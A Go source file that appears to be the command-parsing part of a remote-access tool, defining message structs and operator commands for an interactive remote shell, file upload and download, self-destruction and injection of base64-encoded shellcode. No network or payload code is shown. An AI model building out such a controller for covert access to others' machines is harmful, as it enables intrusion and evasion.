package remoteop

import (
	"errors"
	"fmt"
)

type CmdMsg struct {
	Status int			`json:"status"`
	Cmd string			`json:"cmd"`
	Msg string			`json:"msg"`
	HasNext bool		`json:"hasnext"`
	NextIsBin bool		`json:"nextbin"`
	NextSize int		`json:"nextsize"`
	NextBinHash string  `json:"binhash"`
}

type UserCmd struct {
	Cmd string
	OptionLCL string
	OptionRMT string
}

const (
	CommandBOOM = "boom"
	CommandINJE = "inje"
	CommandBASH = "bash"
	CommandUPLD = "upld"
	CommandDWLD = "dwld"
	CommandEXIT = "exit"
	StatusOK = 0
	StatusNEXISTS = 1
	StatusFAILED = 2
	StatusOtherErr = 3
)

func printHelp() {
	fmt.Println(
		`
Usage: 
bash = Get Shell (Interactive)
upload <Source File Path> <Destination File Path> = Upload file
download <Source File Path> <Destination File Path> = Download file
boom = Self-Destroy
exit = Close Program
help = Show This Message
inject <BASE64-Encoded Code> = Execute Shell Code
`)
}

func (ucmd *UserCmd) ParseUserInput(uipt []string) (error){
	if len(uipt) == 1 || len(uipt) > 3{
		switch uipt[0]{
		case CommandBASH:
			ucmd.Cmd = CommandBASH
		case CommandBOOM:
			ucmd.Cmd = CommandBOOM
		case CommandEXIT:
			return errors.New("USER_EXIT")
		case "help":
			fallthrough
		default:
			printHelp()
			return nil
		}
	} else if len(uipt) == 2 {
		switch uipt[0] {
		case "inject":
			ucmd.Cmd = CommandINJE
			ucmd.OptionRMT = uipt[1]
		default:
			printHelp()
			return nil
		}
	} else {
		switch uipt[0]{
		case "download":
			ucmd.Cmd = CommandDWLD
			ucmd.OptionRMT = uipt[1]
			ucmd.OptionLCL = uipt[2]
			return nil
		case "upload":
			ucmd.Cmd = CommandUPLD
			ucmd.OptionLCL = uipt[1]
			ucmd.OptionRMT = uipt[2]
			return nil
		default:
			printHelp()
			return nil
		}
	}
	return nil
}
